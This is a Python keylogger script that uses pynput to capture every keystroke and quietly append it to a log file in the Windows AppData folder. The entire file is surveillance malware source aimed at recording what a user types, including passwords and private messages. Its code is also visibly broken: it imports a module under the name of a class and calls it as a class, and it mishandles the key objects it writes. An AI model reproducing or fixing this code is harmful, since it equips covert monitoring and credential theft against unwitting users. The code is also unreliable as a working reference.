import os
import pynput.keyboard as Listener
import sys

keys = []
count = 0
path = os.environ['appData'] + '\\logger.txt' if sys.platform == 'win32' else 'logger.txt'


def write_to_file(keys: dict):
    with open(path, 'a') as file:  # opens as append
        for key in keys:
            k = str(key).replace("'", "")
            if k.find('backspace') > 0:
                file.write(' Backspace ')
            elif k.find('enter') > 0:
                file.write(' \n ')
            elif k.find('space') > 0:
                file.write(' ')
            elif k.find('shift') > 0:
                file.write(' Shift ')
            elif k.find('caps_lock') > 0:
                file.write(' caps_lock ')
            else:
                file.write(key)


def on_press(key):
    """logs pressed key after each stroke"""
    global keys, count
    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_to_file(key)
        keys = []  # avoids duplicate entries


with Listener(on_press=on_press) as listener:
    listener.join()
